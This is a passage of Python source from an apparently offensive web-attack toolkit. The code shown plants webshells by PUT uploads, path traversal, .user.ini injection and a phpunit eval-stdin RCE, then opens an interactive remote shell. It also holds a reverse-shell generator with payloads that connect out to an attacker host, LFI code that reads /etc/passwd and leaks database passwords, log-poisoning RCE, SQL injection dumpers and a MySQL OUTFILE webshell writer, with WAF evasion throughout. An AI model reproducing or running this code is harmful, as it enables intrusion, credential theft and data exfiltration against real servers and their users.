            r = requests.post(self.base + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                data=f"<?=file_put_contents('{fn}',base64_decode('{b64}'));?>",
                timeout=6, verify=False)
            if r.status_code in (200, 201) and self._vfy(self.base + "/" + fn):
                return self.base + "/" + fn
        except: pass
        return None

    # ── TECHNIQUE 9: Base64 PUT via path traversal ──
    def _try_path_traversal_put(self, shell):
        traversals = [
            f"../../../../../../var/www/html/{shell['fn']}",
            f"../../../html/{shell['fn']}",
            f"../../httpd/htdocs/{shell['fn']}",
            f"../../www/{shell['fn']}",
            f"../../../www/html/{shell['fn']}",
        ]
        for base in [self.base + self.script_path + "/", self.base + "/"]:
            for t in traversals:
                try:
                    r = requests.put(base + t, data=shell["code"],
                        headers={**self.bypass.bypass_headers, "User-Agent": random.choice(self.bypass.ua_list)},
                        timeout=6, verify=False)
                    if r.status_code in (200,201,204) and self._vfy(self.base + "/" + shell["fn"]):
                        return self.base + "/" + shell["fn"]
                except: pass
        return None

    # ── TECHNIQUE 10: PHP info → auto-shell via php.ini ──
    def _try_php_info_write(self, shell):
        user_ini = f"auto_prepend_file={shell['fn']}\n"
        for base in set([self.base + self.dir_path, self.base]):
            try:
                requests.put(base+"/.user.ini", data=user_ini,
                    headers={"User-Agent": random.choice(self.bypass.ua_list)}, timeout=4, verify=False)
                requests.put(base+"/"+shell["fn"], data=shell["code"],
                    headers={"User-Agent": random.choice(self.bypass.ua_list)}, timeout=4, verify=False)
                if self._vfy(base+"/"+shell["fn"]):
                    return base+"/"+shell["fn"]
            except: pass
        return None

    def exec_cmd(self, shell_url, cmd="id"):
        try:
            r = self.bypass.get(shell_url, params={"cmd": cmd}, timeout=10)
            if r.status_code == 200 and r.text:
                t = r.text
                ct = r.headers.get("Content-Type", "")
                if "text/plain" in ct:
                    return t.strip() or None
                if "<pre>" in t:
                    x = t.split("<pre>")[1].split("</pre>")[0].strip()
                    if x: return x
                nohtml = re.sub(r'<[^>]+>', '', t).strip()
                nohtml = re.sub(r'\s+', ' ', nohtml)
                if t.strip().startswith("<!DOCTYPE") or t.strip().startswith("<html"):
                    return None
                if len(nohtml) < 200:
                    return nohtml or None
                return nohtml[:500]
        except: pass
        return None

    def run(self, shell_type="php", method="auto"):
        header("WEBSHELL — ACTIVE BACKDOOR DEPLOYMENT")
        print(f"  {C}◉{N} URL: {Y}{self.raw}{N} | Type: {Y}{shell_type}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Unreachable.\n"); return None
        if self.bypass.status_code in (403, 401, 503):
            print(f"\n  {R}✘{N} Server blocks requests (HTTP {self.bypass.status_code}). Try SQL/LFI instead.\n")
            return None

        shell = self._sh(shell_type)
        if not shell: return None

        techniques = [
            ("PUT writable dir", self._try_put),
            ("POST upload endpoints", self._try_post_endpoints),
            ("POST chunked", self._try_post_chunked),
            ("POST form field", self._try_post_form),
            ("POST JSON base64", self._try_post_json),
            (".htaccess bypass", self._try_htaccess_bypass),
            ("WordPress XML-RPC", self._try_wp_xmlrpc),
            ("Drupalgeddon2", self._try_drupalgeddon2),
            ("Framework RCE", self._try_framework_rce),
            ("Path traversal PUT", self._try_path_traversal_put),
            (".user.ini inject", self._try_php_info_write),
        ]

        url = None
        for name, func in techniques:
            print(f"  {C}▶{N} Trying {Y}{name}{N}...", end="\r")
            url = func(shell)
            if url:
                print(f"  {G}✔{N} {BOLD}{name}: SUCCESS{N}")
                print(f"      {Y}{url}{N}")
                break

        if url:
            print(f"\n  {BOLD}{C}TESTING WEBSHELL{N}")
            result = self.exec_cmd(url, "id")
            if result:
                print(f"  {G}✔{N} Command execution OK!")
                print(f"  {W}{result.strip()[:300]}{N}")
                print(f"\n  {BOLD}{C}INTERACTIVE SHELL (type 'exit' to quit){N}")
                try:
                    while True:
                        c = input(f"  {R}shell{N}@{Y}{self.host}{N} {R}$ {N}").strip()
                        if c.lower() in ("exit","quit","q"): break
                        if c.lower() == "clear": os.system('cls' if os.name == 'nt' else 'clear'); continue
                        out = self.exec_cmd(url, c)
                        if out: print(f"  {W}{out}{N}")
                except (KeyboardInterrupt, EOFError): print()
            return {"url": url, "type": shell_type}
        print(f"\n  {R}✘{N} All 10 techniques failed. Target may not allow upload.\n")
        return None


# ══════════════════════════════════════════════════════
#  REVERSE SHELL GENERATOR
# ══════════════════════════════════════════════════════

class ReverseShell:
    PAYLOADS = {
        "bash": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
        "bash_readline": "exec 5<>/dev/tcp/{host}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",
        "python": """python3 -c '
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
'""",
        "python_short": 'python -c "import os,socket,pty;s=socket.socket();s.connect((\\"{host}\\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")"',
        "php": """php -r '$s=fsockopen("{host}",{port});exec("/bin/bash -i <&3 >&3 2>&3");'""",
        "nc": "nc -e /bin/bash {host} {port}",
        "nc_traditional": "nc.traditional -e /bin/bash {host} {port}",
        "powershell": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()""",
        "perl": """perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}}'""",
        "ruby": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{host}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}};end'",
        "socat": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{host}:{port}",
        "telnet": "rm -f /tmp/p; mknod /tmp/p p && telnet {host} {port} 0</tmp/p | bash 1>/tmp/p",
        "xterm": "xterm -display {host}:{port}",
        "nc_pipe": "mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {host} {port} >/tmp/f",
        "awk": "awk 'BEGIN{s=\"/inet/tcp/0/{host}/{port}\";for(;s|&getline c;close(c))while(c|&getline)print $0|&s;close(s)}'",
        "node": "node -e 'require(\"child_process\").exec(\"bash -i >& /dev/tcp/{host}/{port} 0>&1\")'",
    }

    def __init__(self, host, port=4444):
        self.host = host
        self.port = port
        self.listener_help = {
            "nc": f"nc -lnvp {port}",
            "socat": f"socat TCP-LISTEN:{port},reuseaddr,fork -",
            "python": f"python3 -c 'import socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();print(f\"Connection from {{a}}\");c.send(b\"Shell> \");import pty;os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/bash\")'",
        }

    def generate(self, lang="bash", url_encode=False):
        payload = self.PAYLOADS.get(lang)
        if not payload:
            return f"Unknown language: {lang}. Available: {', '.join(self.PAYLOADS.keys())}"
        result = payload.format(host=self.host, port=self.port)
        if url_encode:
            result = urllib.parse.quote(result)
        return result

    def listener_cmd(self, method="nc"):
        return self.listener_help.get(method, f"nc -lnvp {self.port}")

    def run(self, lang="bash", url_encode=False):
        header("REVERSE SHELL — PAYLOAD GENERATOR")
        print(f"  {C}◉{N} LHOST: {Y}{self.host}{N}  |  LPORT: {Y}{self.port}{N}")
        print(f"  {C}◉{N} Lang : {Y}{lang}{N}")
        print(f"\n  {BOLD}{C}LISTENER (run on your machine):{N}")
        for method, cmd in self.listener_help.items():
            print(f"  {G}{method:>8}{N}: {Y}{cmd}{N}")
        print(f"\n  {BOLD}{C}PAYLOAD:{N}")
        payload = self.generate(lang, url_encode)
        print(f"\n  {W}{payload}{N}\n")

        print(f"  {BOLD}{C}CMD INJECTION / WEBSHELL USE:{N}")
        if url_encode:
            print(f"  {D}URL: {Y}?cmd={payload}{N}")
        else:
            print(f"  {D}Direct: {Y}{payload}{N}")
        print(f"  {D}WebShell: {Y}?cmd={urllib.parse.quote(payload) if not url_encode else payload}{N}")
        print()
        return payload


# ══════════════════════════════════════════════════════
#  LFI EXPLOITER — Read Files + RCE
# ══════════════════════════════════════════════════════

class LFIExploiter:
    def __init__(self, url, param, bypass=None):
        self.url = url
        self.param = param
        self.bypass = bypass or BypassEngine(url)
        self.parsed = urlparse(url)
        self.params = parse_qs(self.parsed.query) if parse_qs(self.parsed.query) else {}

    def _build(self, payload):
        new = urllib.parse.urlencode({k: (payload if k == self.param else v[0]) for k, v in self.params.items()})
        return f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"

    def _generate_payloads(self, path):
        """Generate multiple encoding variants of a path for WAF bypass."""
        p = path
        seen = set()
        variants = []
        def add(v):
            if v not in seen:
                seen.add(v)
                variants.append(v)
        add(p)  # raw
        if "../" in p:
            add(p.replace("../", "....//"))  # WAF dot-dot bypass
            add(p.replace("../", "..;/"))  # IIS bypass
            add(p.replace("../", "..%252f"))  # double encode
            add(p.replace("../", "..\\"))  # backslash
            add(p.replace("../", "").replace("../../", "../"))  # nested
            add("/" + p.lstrip(".").lstrip("/"))  # absolute
        else:
            add(p.replace("/", "%2f"))  # single encode absolute path
            add("....//....//....//....//" + p.lstrip("/"))  # dot-dot absolute
            add("..;/..;/..;/..;/" + p.lstrip("/"))  # IIS absolute
        add(p + "%00")  # null byte
        add(p.rstrip("/") + "/.")  # trailing dot
        if p.startswith("/"):
            add("php://filter/convert.base64-encode/resource=" + p.lstrip("/"))
        for v in variants:
            yield v

    def read_file(self, path, max_attempts=12):
        for i, variant in enumerate(self._generate_payloads(path)):
            if i >= max_attempts: break
            u = self._build(variant)
            try:
                r = self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
            except: continue
            if r and r.status_code == 200:
                txt = r.text or ""
                if any(kw in txt for kw in ["root:x:", "daemon:x:", "www-data:x:", "nobody:x:", "# MySQL dump", "<?php"]):
                    return txt
                if len(txt) > 100 and not txt.startswith("<!DOCTYPE") and not txt.startswith("<html"):
                    return txt
        return None

    def read_etc_passwd(self):
        results = []
        for path in ["/etc/passwd", "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
                      "....//....//....//....//etc/passwd", "/etc/hosts", "/etc/issue"]:
            for i, variant in enumerate(self._generate_payloads(path)):
                if i >= 6: break
                u = self._build(variant)
                try:
                    r = self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
                except: continue
                if r and r.status_code == 200 and (txt := r.text or ""):
                    if "root:x:" in txt:
                        print(f"  {G}✔{N} /etc/passwd ({path[:35]}...)")
                        users = re.findall(r'^([^:]+):', txt, re.M)
                        print(f"  {D}Users: {', '.join(users[:10])}{N}")
                        results.append(("passwd", txt))
                        return "\n".join(r[1] for r in results)
                    if "127.0.0.1" in txt and "localhost" in txt:
                        print(f"  {G}✔{N} /etc/hosts readable!")
                        results.append(("hosts", txt))
                    if "Ubuntu" in txt or "Debian" in txt:
                        print(f"  {G}✔{N} /etc/issue: {Y}{txt.strip()}{N}")
                        results.append(("issue", txt))
                if results: break
            if results: break
        if results:
            return "\n".join(r[1] for r in results)
        return None

    def read_php_source(self, path="index"):
        wrappers = [
            f"php://filter/convert.base64-encode/resource={path}",
            f"php://filter/convert.base64-encode/resource={path}.php",
            f"php://filter/read=convert.base64-encode/resource={path}",
            f"php://filter/convert.base64-encode/resource={path}.php%00",
            f"PHP://filter/convert.base64-encode/resource={path}",
            f"pHp://FiLter/convert.base64-encode/resource={path}",
        ]
        payloads = list(self._generate_payloads(path))
        payloads.extend(wrappers)
        seen = set()
        for payload in payloads:
            if payload in seen: continue
            seen.add(payload)
            result = self.read_file(payload)
            if not result: continue
            b64s = re.findall(r'([A-Za-z0-9+/=]{80,})', result)
            for b64 in b64s:
                try:
                    decoded = base64.b64decode(b64).decode()
                    if "<?php" in decoded or "<?=" in decoded:
                        print(f"  {G}✔{N} Source of {Y}{path}{N}:")
                        print(f"  {D}{'─'*40}{N}")
                        for line in decoded.split("\n")[:30]:
                            print(f"  {W}{line}{N}")
                        if "DB_PASSWORD" in decoded or "db_password" in decoded:
                            pwds = re.findall(r"['\"]?(?:DB_)?PASSWORD['\"]?\s*[=:]\s*['\"]([^'\"]+)", decoded, re.I)
                            if pwds:
                                print(f"  {R}⚠{N} {BOLD}CREDENTIALS: {', '.join(pwds)}{N}")
                        return decoded
                except: pass
        return None

    def log_poison_rce(self, cmd="id", log_path=None):
        logs = log_path and [log_path] or [
            "../../../../../../var/log/apache2/access.log",
            "../../../../../../var/log/httpd/access_log",
            "../../../../../../var/log/apache/access.log",
            "../../../../../../var/log/nginx/access.log",
            "../../../../../../var/log/apache2/error.log",
            "../../../../../../var/log/httpd/error_log",
            "../../../../../../var/log/nginx/error.log",
            "../../../../../../var/log/auth.log",
            "../../../../../../var/log/messages",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/proc/self/environ",
        ]
        for fd in range(0, 20):
            logs.append(f"../../../../../../proc/self/fd/{fd}")

        marker = "nusa" + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
        php_payload = f"<?php echo '{marker}'; system('{cmd}'); echo '{marker}'; ?>"
        ua_headers = {
            "User-Agent": php_payload,
            "Referer": php_payload,
            "Cookie": f"PHPSESSID={php_payload}",
            "X-Forwarded-For": php_payload,
            "X-Forwarded-Host": php_payload,
        }
        for hdr_name, hdr_val in ua_headers.items():
            try:
                requests.get(self.url, headers={hdr_name: hdr_val}, timeout=3, verify=False)
            except: pass
        try:
            requests.post(self.url, data={self.param: "1"}, headers=ua_headers, timeout=3, verify=False)
        except: pass

        for log in logs:
            for variant in self._generate_payloads(log):
                u = self._build(variant)
                try:
                    r = self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
                except: continue
                if r and (txt := r.text or ""):
                    if marker in txt:
                        print(f"  {R}⚡{N} {BOLD}RCE via {log.split('/')[-1]}!{N}")
                        output = txt.split(marker, 1)[1].split(marker, 1)[0].strip() if len(txt.split(marker)) > 2 else txt.split(marker)[1][:200]
                        print(f"  {W}{output[:300]}{N}")
                        return txt
                    if ("GET" in txt or "POST" in txt or "HTTP/" in txt) and len(txt) > 50:
                        if not any(x in txt[:50] for x in ["<!DOCTYPE","<html","<head"]):
                            print(f"  {Y}⚠{N} Log readable: {Y}{log.split('/')[-1]}{N}")
                            return txt
                if r and r.status_code == 200:
                    break
        return None

    def proc_environ_rce(self, cmd="id"):
        try:
            result = self.read_file("../../../../../../proc/self/environ")
        except: result = None
        if result and "HTTP_USER_AGENT" in result:
            print(f"  {Y}⚠{N} /proc/self/environ readable! Injecting...")
            marker = "nusa" + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
            try:
                requests.get(self.url, headers={"User-Agent": f"<?php echo '{marker}'; system('{cmd}'); echo '{marker}'; ?>", "X-Forwarded-For": f"<?php echo '{marker}'; system('{cmd}'); echo '{marker}'; ?>"}, timeout=3, verify=False)
            except: pass
            try:
                for variant in self._generate_payloads("../../../../../../proc/self/environ"):
                    u = self._build(variant)
                    try:
                        r = self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
                    except: continue
                    if r and (txt := r.text or "") and marker in txt:
                        print(f"  {R}⚡{N} {BOLD}RCE via /proc/self/environ!{N}")
                        return txt
            except: pass
        return None

    def _try_data_wrapper(self, cmd="id"):
        """PHP input wrapper RCE via data://."""
        marker = "nusa" + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
        b64 = base64.b64encode(f"<?php echo '{marker}'; system('{cmd}'); echo '{marker}'; ?>".encode()).decode()
        for payload in [f"data://text/plain;base64,{b64}", f"php://input&cmd={cmd}"]:
            u = self._build(payload)
            try:
                r = self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
            except: continue
            if r and (txt := r.text or "") and marker in txt:
                print(f"  {R}⚡{N} {BOLD}RCE via data wrapper!{N}")
                output = txt.split(marker, 1)[1].split(marker, 1)[0].strip()
                if output: print(f"  {W}{output[:300]}{N}")
                return txt
        return None

    def scan(self):
        header("LFI EXPLOITER — FILE READ → RCE")
        print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
        print(f"  {C}◉{N} Param: {Y}{self.param}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable.\n"); return None

        print(f"\n  {BOLD}{C}PHASE 1: FILE READ{N}")
        for fname in ["/etc/passwd", "/etc/hosts", "/etc/issue", "/proc/self/environ"]:
            result = self.read_file(fname)
            if result and "root:x:" in result:
                print(f"  {G}✔{N} /etc/passwd: {len(result)} bytes")
                users = re.findall(r'^([^:]+):', result, re.M)
                print(f"  {D}Users: {', '.join(users[:8])}{N}")
            elif result and "127.0.0.1" in result:
                print(f"  {G}✔{N} /etc/hosts readable")
            elif result and "HTTP_USER_AGENT" in result:
                print(f"  {Y}⚠{N} /proc/self/environ readable — can inject RCE")

        print(f"\n  {BOLD}{C}PHASE 2: PHP SOURCE LEAK{N}")
        found_src = False
        for target in ["index", "config", "admin", "login", "wp-config", "db", "settings", ".env"]:
            src = self.read_php_source(target)
            if src:
                found_src = True
                break
        if not found_src:
            print(f"  {Y}⚠{N} No PHP source leaked")

        rce_success = False

        print(f"\n  {BOLD}{C}PHASE 3: LOG POISONING → RCE{N}")
        rce = self.log_poison_rce()
        if rce: rce_success = True

        if not rce_success:
            rce = self.proc_environ_rce()
            if rce: rce_success = True

        if not rce_success:
            rce = self._try_data_wrapper()
            if rce: rce_success = True

        if not rce_success:
            print(f"  {Y}⚠{N} LFI RCE failed (try --proxy or different param)")

        print()
        return rce or ""


# ══════════════════════════════════════════════════════
#  SQL AUTO EXPLOIT — Full DB Dump
# ══════════════════════════════════════════════════════

class SQLAutoExploit:
    def __init__(self, url, method="GET", param=None, bypass=None):
        self.scanner = SQLiScanner(url, method, param, bypass)
        self.url = url
        self.data = {}

    def dump_all(self):
        header("SQL AUTO EXPLOIT — FULL DATABASE DUMP")
        print(f"  {C}◉{N} URL: {Y}{self.url}{N}")
        if self.scanner.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable.\n"); return None

        print(f"\n  {BOLD}{C}PHASE 1: INJECTION DETECTION{N}")
        inj = self.scanner._find_injection()
        if not inj:
            print(f"  {R}✘{N} No injection point found.\n"); return None
        print(f"  {G}✔{N} Injectable: {Y}{inj}{N}")
        self.scanner.injectable_param = inj

        print(f"\n  {BOLD}{C}PHASE 2: COLUMN COUNT{N}")
        cols = self.scanner._find_column_count()
        print(f"  {G}✔{N} Columns: {Y}{cols}{N}")

        print(f"\n  {BOLD}{C}PHASE 3: DATABASE INFO{N}")
        for name, expr in [("Version", "@@version"), ("Database", "database()"), ("User", "user()")]:
            data = self.scanner._extract_data(expr)
            if data:
                val = ' '.join(data[:3])
                self.data[name] = val
                print(f"  {G}•{N} {name}: {Y}{val}{N}")

        print(f"\n  {BOLD}{C}PHASE 4: TABLE ENUMERATION{N}")
        tbl_expr = "group_concat(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema=database()"
        data = self.scanner._extract_data(tbl_expr)
        tables = []
        if data:
            raw = " ".join(data)
            tables = [t.strip() for t in raw.replace("|", " ").split() if t.strip() and len(t.strip()) < 50]
            if tables:
                print(f"  {G}✔{N} Tables ({len(tables)}): {Y}{', '.join(tables)}{N}")
        self.data["tables"] = tables

        print(f"\n  {BOLD}{C}PHASE 5: DATA DUMP{N}")
        for table in tables[:10]:
            col_expr = f"group_concat(column_name SEPARATOR '|') FROM information_schema.columns WHERE table_name='{table}'"
            col_data = self.scanner._extract_data(col_expr)
            cols_list = []
            if col_data:
                raw = " ".join(col_data)
                cols_list = [c.strip() for c in raw.replace("|", " ").split() if c.strip() and len(c.strip()) < 50]
            if not cols_list:
                continue
            sel = ",".join(cols_list[:8])
            row_expr = f"group_concat({sel} SEPARATOR '|') FROM {table}"
            row_data = self.scanner._extract_data(row_expr)
            if row_data:
                raw = " ".join(row_data)
                rows_raw = [r.strip() for r in raw.split("|") if r.strip()]
                print(f"\n  {C}▶{N} {Y}{table}{N} ({len(cols_list)} cols, {len(rows_raw)} rows)")
                print(f"      {D}Columns: {', '.join(cols_list[:8])}{N}")
                for row in rows_raw[:15]:
                    clean = re.sub(r'\s+', ' ', row).strip()[:120]
                    if clean:
                        print(f"      {G}→{N} {W}{clean}{N}")
                self.data[table] = {"columns": cols_list, "rows": rows_raw[:15]}

        outfile = f"sqli_dump_{urlparse(self.url).netloc}.txt"
        with open(outfile, "w") as f:
            for table, info in self.data.items():
                f.write(f"[{table}]\n")
                if isinstance(info, dict):
                    f.write(f"  Columns: {', '.join(info.get('columns',[]))}\n")
                    for r in info.get("rows",[]):
                        f.write(f"  Data: {r}\n")
                else:
                    f.write(f"  {info}\n")
        print(f"\n  {G}✔{N} Dump saved to {Y}{outfile}{N}")
        print()
        return self.data

    def write_webshell(self, path=None):
        """Write PHP webshell via MySQL INTO OUTFILE (bypasses HTTP upload limits)."""
        shell_code = "<?php ob_clean();header('Content-Type: text/plain');echo shell_exec($_REQUEST['cmd']??'id');exit;?>"
        paths = path or ["/var/www/html/", "/var/www/", "/var/www/public/", "/var/www/html/public/",
                         "/usr/local/nginx/html/", "/usr/local/apache2/htdocs/", "/home/",
                         "/tmp/", "/var/tmp/"]
        if isinstance(paths, str): paths = [paths]
        ext = self.scanner
        col_count = ext._find_column_count() or 1
        fn = f"nusa_{random.randint(10000,99999)}.php"
        for p in paths:
            escaped = p.replace("/", "\\\\/").replace("'", "\\\\'")
            sql = f"UNION SELECT {col_count - 1},{col_count} FROM (SELECT 1)a JOIN (SELECT 2)b"
            sql = f"' UNION SELECT '{shell_code}' INTO OUTFILE '{p}{fn}' -- -"
            try:
                u = ext._build(ext.injectable_param, sql)
                r = ext.bypass.get(u, timeout=10)
                if r.status_code == 200:
                    vurl = self.url.split("?")[0].rsplit("/", 1)[0] + "/" + fn
                    r2 = requests.get(vurl, timeout=6, verify=False)
                    if r2.status_code == 200 and not r2.text.strip().startswith("<!DOCTYPE"):
                        print(f"  {G}[✔]{N} WEBSHELL via MySQL OUTFILE: {Y}{vurl}{N}")
                        return vurl
            except: pass
        print(f"  {Y}[−]{N} MySQL OUTFILE write failed (check MySQL user privileges)")
        return None


# ══════════════════════════════════════════════════════
#  CMS EXPLOITER — WordPress / Joomla / Drupal
# ══════════════════════════════════════════════════════
#  BLIND SQLi EXPLOITER — Boolean + Time Based
# ══════════════════════════════════════════════════════

class BlindSQLiExploiter:
    def __init__(self, url, param, method="GET", technique="auto", delay=2, bypass=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.technique = technique
        self.delay = delay
        self.bypass = bypass or BypassEngine(url)
        self.parsed = urlparse(url)
        self.params = parse_qs(self.parsed.query) if parse_qs(self.parsed.query) else {}
        self.data = {}
        self.baseline_len = 0
        self.diff_true = 0
        self.diff_false = 0
        self.use_time = technique == "time"
        self.req_count = 0

    def _jitter(self):
        time.sleep(random.uniform(0.3, 0.9))

    def _payloads(self, condition):
        variants = [
            f"1' AND {condition}-- -",
            f"1\" AND {condition}-- -",
            f"1 AND {condition}-- -",
            f"1') AND {condition}-- -",
            f"1\") AND {condition}-- -",
            f"1' AND {condition}#",
            f"1' AND {condition}-- ",
            f"1' AND {condition}/*",
        ]
        return variants

    def _req(self, payload, retry=2):
        if self.bypass.connect_error: return None
        new = urllib.parse.urlencode({k: (payload if k == self.param else v[0]) for k, v in self.params.items()})
        u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
        for _ in range(retry):
            try:
                self.req_count += 1
                return self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
            except: time.sleep(1)
        return None

    def _setup(self):
        r = self._req(str(random.randint(1,99999)))
        if not r: return False
        self.baseline_len = len(r.text or "")
        self._jitter()

        for variant in self._payloads("1=1"):
            r_true = self._req(variant)
            if r_true:
                self.diff_true = abs(len(r_true.text or "") - self.baseline_len)
                break
        if not self.diff_true:
            for variant in ["1 AND 1=1", "admin' OR '1'='1"]:
                r_true = self._req(variant)
                if r_true: self.diff_true = abs(len(r_true.text or "") - self.baseline_len); break
        if not self.diff_true: return False

        self._jitter()
        for variant in self._payloads("1=2"):
            r_false = self._req(variant)
            if r_false:
                self.diff_false = abs(len(r_false.text or "") - self.baseline_len)
                break
        if not self.diff_false:
            for variant in ["1 AND 1=2", "admin' AND '1'='2"]:
                r_false = self._req(variant)
                if r_false: self.diff_false = abs(len(r_false.text or "") - self.baseline_len); break
        if not self.diff_false: return False

        if abs(self.diff_true - self.diff_false) < 5:
            self.use_time = True
            return True
        return abs(self.diff_true - self.diff_false) > 3

    def _true(self, condition):
        if self.bypass.connect_error: return False
        if self.use_time:
            payload = f"1' AND IF({condition},SLEEP({self.delay}),0)-- -"
            new = urllib.parse.urlencode({k: (payload if k == self.param else v[0]) for k, v in self.params.items()})
            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
            try:
                start = time.time()
                self.bypass.get(u, timeout=self.delay*3+5, allow_redirects=False)
                return time.time() - start >= self.delay * 0.8
            except: return False
        else:
            for variant in self._payloads(condition):
                self._jitter()
                r = self._req(variant)
                if not r: continue
                d = abs(len(r.text or "") - self.baseline_len)
                if abs(d - self.diff_true) < abs(d - self.diff_false):
                    return True
            return False

    def _len(self, query):
        l = 1
        while l <= 512:
            if self._true(f"LENGTH(({query}))={l}"): return l
            l += 1 if l < 32 else 5 if l < 100 else 20
        return 0

    def _chr(self, query, pos):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if self._true(f"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo)

    def _extract(self, query, max_len=200):
        if not self._true(f"LENGTH(({query}))>0"):
            return None
        length = self._len(query)
        if length == 0 or length > max_len: return None
        res = ""
        for pos in range(1, length + 1):
            ch = self._chr(query, pos)
            res += ch
            if pos % 3 == 0:
                print(f"      {D}[{pos}/{length}] {res[-30:]}{' '*10}{N}", end="\r")
        return res

    def dump_all(self):
        header("BLIND SQLi EXPLOITER — AUTO DATA EXTRACTION")
        print(f"  {C}◉{N} URL: {Y}{self.url}{N}")
        print(f"  {C}◉{N} Param: {Y}{self.param}{N} | Tech: {Y}{self.technique.upper()}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Unreachable.\n"); return None

        print(f"\n  {BOLD}{C}CALIBRATE{N}")
        if not self._setup():
            print(f"  {R}✘{N} Calibration failed.\n"); return None
        inj_type = 'Time' if self.use_time else 'Boolean'
        print(f"  {G}✔{N} {inj_type}-based injection detected ({self.req_count} probe reqs)")
        # Confirm with a second distinct condition to avoid false positives
        confirm = self._true("LENGTH(database())>0")
        if not confirm:
            print(f"  {Y}⚠{N} Confirmation failed — likely WAF/network latency, not real injection")
            print(f"  {D}Try: blindsqli --tech boolean (or use --delay {self.delay+1}){N}")
            print()
            return None

        print(f"\n  {BOLD}{C}DATABASE INFO{N}")
        for name, sql in [("Version","@@version"),("Database","database()"),("User","user()")]:
            print(f"  {C}▶{N} {Y}{name}{N}...")
            v = self._extract(f"SELECT {sql}")
            if v: print(f"\n  {G}✔{N} {name}: {Y}{v}{N}"); self.data[name.lower()] = v

        print(f"\n  {BOLD}{C}TABLES{N}")
        tables = []
        for i in range(20):
            q = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {i}"
            if not self._true(f"EXISTS({q})"): break
            v = self._extract(q)
            if v: tables.append(v); print(f"\n  {G}✔{N} {Y}{v}{N}")
            else: break
        self.data["tables"] = tables

        print(f"\n  {BOLD}{C}DATA DUMP{N}")
        for tbl in tables[:5]:
            cols = []
            for i in range(20):
                q = f"SELECT column_name FROM information_schema.columns WHERE table_name='{tbl}' LIMIT 1 OFFSET {i}"
                if not self._true(f"EXISTS({q})"): break
                v = self._extract(q)
                if v: cols.append(v) or print(f"\n  {G}→{N} col: {Y}{v}{N}")
                else: break
            if not cols: continue
            for ri in range(5):
                q = f"SELECT {','.join(cols[:3])} FROM {tbl} LIMIT 1 OFFSET {ri}"
                if not self._true(f"EXISTS({q})"): break
                v = self._extract(q)
                if v: print(f"      {G}→{N} {W}{v[:150]}{N}")

        fn = f"blind_sqli_{urlparse(self.url).netloc}.txt"
        with open(fn,"w") as f:
            for k,v in self.data.items():
                f.write(f"[{k}]\n{v}\n")
        print(f"\n  {G}✔{N} {self.req_count} requests | Saved: {Y}{fn}{N}")
        print()
        return self.data


class CMSExploiter:
    def __init__(self, url, bypass=None):
        self.url = url.rstrip("/")
        self.bypass = bypass or BypassEngine(url)
        self.cms = None
        self.vulns = []

    def detect(self):
        try:
            r = self.bypass.get(self.url, timeout=10)
            html = r.text.lower()
            if "/wp-content/" in html or "/wp-includes/" in html or "wordpress" in html:
                self.cms = "WordPress"
            elif "/components/" in html and "/modules/" in html and "joomla" in html:
                self.cms = "Joomla"
